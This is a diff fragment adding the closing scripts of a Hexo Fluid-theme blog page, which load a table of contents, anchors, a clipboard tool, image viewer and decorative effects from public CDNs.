+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/love.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
